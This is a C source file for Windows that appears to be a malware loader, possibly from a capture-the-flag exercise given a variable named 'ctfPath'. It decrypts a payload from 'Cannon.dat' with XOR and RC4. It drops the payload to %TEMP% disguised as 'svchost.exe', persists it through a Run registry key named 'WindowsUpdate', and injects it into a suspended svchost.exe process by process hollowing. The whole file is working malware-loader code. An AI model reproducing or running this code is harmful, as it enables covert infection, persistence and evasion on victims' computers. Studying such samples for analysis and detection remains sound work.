/*
 * Decrypt encrypted data (XOR config + RC4 + XOR tail)
 * Persistence (drop to %TEMP% + HKCU Run key)
 * Process Hollowing (inject decrypted PE into suspended svchost.exe)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(WINAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS,
                                                     PVOID, ULONG, PULONG);

static void rc4(BYTE *data, size_t size, const BYTE *key) {
    BYTE s[256], i = 0, j = 0, t;
    size_t n;

    for (n = 0; n < 256; n++)
        s[n] = (BYTE)n;

    for (n = 0; n < 256; n++) {
        j = (BYTE)(j + s[n] + key[n % 8]);
        t = s[n];
        s[n] = s[j];
        s[j] = t;
    }

    j = 0;
    for (n = 0; n < size; n++) {
        i = (BYTE)(i + 1);
        j = (BYTE)(j + s[i]);
        t = s[i];
        s[i] = s[j];
        s[j] = t;
        data[n] ^= s[(BYTE)(s[i] + s[j])];
    }
}

static DWORD rvaToRawOffset(PIMAGE_NT_HEADERS ntHeaders, DWORD rva) {
    PIMAGE_SECTION_HEADER sh = IMAGE_FIRST_SECTION(ntHeaders);
    int i;
    for (i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        DWORD size = sh->Misc.VirtualSize ? sh->Misc.VirtualSize
                                          : sh->SizeOfRawData;
        if (rva >= sh->VirtualAddress && rva < sh->VirtualAddress + size)
            return sh->PointerToRawData + rva - sh->VirtualAddress;
        sh++;
    }
    return 0;
}

static void fixRelocation(HANDLE proc, LPVOID baseAddr, DWORD delta,
                          LPVOID buf, PIMAGE_NT_HEADERS nt) {
    IMAGE_DATA_DIRECTORY relocDir;
    DWORD relocRaw;
    PIMAGE_BASE_RELOCATION pReloc;

    if (delta == 0)
        return;

    relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir.VirtualAddress == 0)
        return;

    relocRaw = rvaToRawOffset(nt, relocDir.VirtualAddress);
    pReloc   = (PIMAGE_BASE_RELOCATION)((SIZE_T)buf + relocRaw);

    while (pReloc->VirtualAddress != 0) {
        DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        PWORD entry = (PWORD)((SIZE_T)pReloc + sizeof(IMAGE_BASE_RELOCATION));
        DWORD i;
        for (i = 0; i < count; i++) {
            WORD type   = entry[i] >> 12;
            WORD offset = entry[i] & 0xFFF;
            if (type == IMAGE_REL_BASED_HIGHLOW) {
                LPVOID patchAddr = (LPVOID)((SIZE_T)baseAddr +
                                            pReloc->VirtualAddress + offset);
                DWORD cur = 0;
                ReadProcessMemory(proc, patchAddr, &cur, sizeof(DWORD), NULL);
                cur += delta;
                WriteProcessMemory(proc, patchAddr, &cur, sizeof(DWORD), NULL);
            }
        }
        pReloc = (PIMAGE_BASE_RELOCATION)((SIZE_T)pReloc + pReloc->SizeOfBlock);
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
    HANDLE heap, hFile;
    BYTE  *file, *config, *pe;
    LARGE_INTEGER fileSize;
    DWORD dwFileSize, transferred;
    size_t pe_size, n, ntOff, tail;
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;

    const size_t config_size = 128;
    const size_t key_offset  = 0x69;

    char exeDir[MAX_PATH], ctfPath[MAX_PATH], tempPath[MAX_PATH], dropPath[MAX_PATH];
    char *lastSlash;

    HKEY  hKey;
    LONG  regResult;

    STARTUPINFOW              si;
    PROCESS_INFORMATION       pi;
    PROCESS_BASIC_INFORMATION pbi;
    DWORD  retLen = 0;
    SIZE_T pebImageBaseOff;
    LPVOID targetBase = NULL;

    PIMAGE_DOS_HEADER     injDos;
    PIMAGE_NT_HEADERS     injNt;
    PIMAGE_SECTION_HEADER injSec;
    DWORD deltaBase;
    CONTEXT ctx;
    int i;

    pNtUnmapViewOfSection        myNtUnmap  = NULL;
    pNtQueryInformationProcess   myNtQuery  = NULL;
    HMODULE hNtdll;

    // Decrypt data

    GetModuleFileNameA(NULL, exeDir, MAX_PATH);
    lastSlash = exeDir;
    for (n = 0; exeDir[n] != '\0'; n++)
        if (exeDir[n] == '\\') lastSlash = exeDir + n;
    if (lastSlash != exeDir) *(lastSlash + 1) = '\0';
    lstrcpyA(ctfPath, exeDir);
    lstrcatA(ctfPath, "Cannon.dat");

    hFile = CreateFileA(ctfPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return 1;

    if (!GetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart > MAXDWORD ||
        fileSize.QuadPart < (LONGLONG)(config_size + sizeof(IMAGE_DOS_HEADER))) {
        CloseHandle(hFile);
        return 2;
    }
    dwFileSize = (DWORD)fileSize.QuadPart;

    heap = GetProcessHeap();
    file = (BYTE *)HeapAlloc(heap, 0, dwFileSize);
    if (!file) { CloseHandle(hFile); return 3; }

    if (!ReadFile(hFile, file, dwFileSize, &transferred, NULL) ||
        transferred != dwFileSize) {
        CloseHandle(hFile);
        HeapFree(heap, 0, file);
        return 4;
    }
    CloseHandle(hFile);

    // Xor decrypt config
    config = file;
    for (n = 0; n < config_size; n++)
        config[n] ^= 0x67;

    // RC4 decrypt
    pe_size = (size_t)dwFileSize - config_size;
    pe      = file + config_size;
    rc4(pe, pe_size, config + key_offset);

    pDos = (PIMAGE_DOS_HEADER)pe;
    ntOff = (size_t)pDos->e_lfanew;
    pNt = (PIMAGE_NT_HEADERS)(pe + ntOff);

    // XOR tail
    tail = ntOff + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) +
           pNt->FileHeader.SizeOfOptionalHeader +
           (size_t)pNt->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
    for (n = tail; n < pe_size; n++)
        pe[n] ^= (BYTE)(pDos->e_cblp ^ pDos->e_cp);

    // Persistence
    GetTempPathA(MAX_PATH, tempPath);
    lstrcpyA(dropPath, tempPath);
    lstrcatA(dropPath, "svchost.exe");

    hFile = CreateFileA(dropPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        HeapFree(heap, 0, file);
        return 9;
    }

    if (!WriteFile(hFile, pe, (DWORD)pe_size, &transferred, NULL) ||
        transferred != pe_size) {
        CloseHandle(hFile);
        HeapFree(heap, 0, file);
        return 10;
    }
    CloseHandle(hFile);

    regResult = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);
    if (regResult != ERROR_SUCCESS) {
        HeapFree(heap, 0, file);
        return 11;
    }

    regResult = RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ,
                               (const BYTE *)dropPath,
                               (DWORD)(lstrlenA(dropPath) + 1));
    RegCloseKey(hKey);
    if (regResult != ERROR_SUCCESS) {
        HeapFree(heap, 0, file);
        return 12;
    }

    // Process hollowing
    hNtdll = GetModuleHandleA("ntdll");
    if (!hNtdll) {
        HeapFree(heap, 0, file);
        return 13;
    }
    myNtUnmap = (pNtUnmapViewOfSection)GetProcAddress(hNtdll,
                    "NtUnmapViewOfSection");
    myNtQuery = (pNtQueryInformationProcess)GetProcAddress(hNtdll,
                    "NtQueryInformationProcess");
    if (!myNtUnmap || !myNtQuery) {
        HeapFree(heap, 0, file);
        return 14;
    }

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessW(L"C:\\Windows\\System32\\svchost.exe",
                        NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
                        NULL, NULL, &si, &pi)) {
        HeapFree(heap, 0, file);
        return 15;
    }

    ZeroMemory(&pbi, sizeof(pbi));
    myNtQuery(pi.hProcess, ProcessBasicInformation, &pbi,
              sizeof(PROCESS_BASIC_INFORMATION), &retLen);
    pebImageBaseOff = (SIZE_T)pbi.PebBaseAddress + 0x08;

    ReadProcessMemory(pi.hProcess, (LPCVOID)pebImageBaseOff,
                      &targetBase, sizeof(LPVOID), NULL);

    injDos = (PIMAGE_DOS_HEADER)pe;
    injNt  = (PIMAGE_NT_HEADERS)(pe + injDos->e_lfanew);

    myNtUnmap(pi.hProcess, targetBase);

    targetBase = VirtualAllocEx(pi.hProcess, targetBase,
                                injNt->OptionalHeader.SizeOfImage,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    if (!targetBase) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(heap, 0, file);
        return 16;
    }


    deltaBase = (DWORD)targetBase - injNt->OptionalHeader.ImageBase;

    injNt->OptionalHeader.ImageBase = (DWORD)targetBase;

    WriteProcessMemory(pi.hProcess, targetBase, pe,
                       injNt->OptionalHeader.SizeOfHeaders, NULL);

    injSec = IMAGE_FIRST_SECTION(injNt);
    for (i = 0; i < injNt->FileHeader.NumberOfSections; i++) {
        LPVOID secDst = (LPVOID)((SIZE_T)targetBase + injSec->VirtualAddress);
        LPVOID secSrc = (LPVOID)((SIZE_T)pe + injSec->PointerToRawData);
        WriteProcessMemory(pi.hProcess, secDst, secSrc,
                           injSec->SizeOfRawData, NULL);
        injSec++;
    }

    fixRelocation(pi.hProcess, targetBase, deltaBase, pe, injNt);

    WriteProcessMemory(pi.hProcess, (LPVOID)pebImageBaseOff,
                       &targetBase, sizeof(LPVOID), NULL);

    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    ctx.Eax = (DWORD)targetBase + injNt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    HeapFree(heap, 0, file);

    return 0;
}
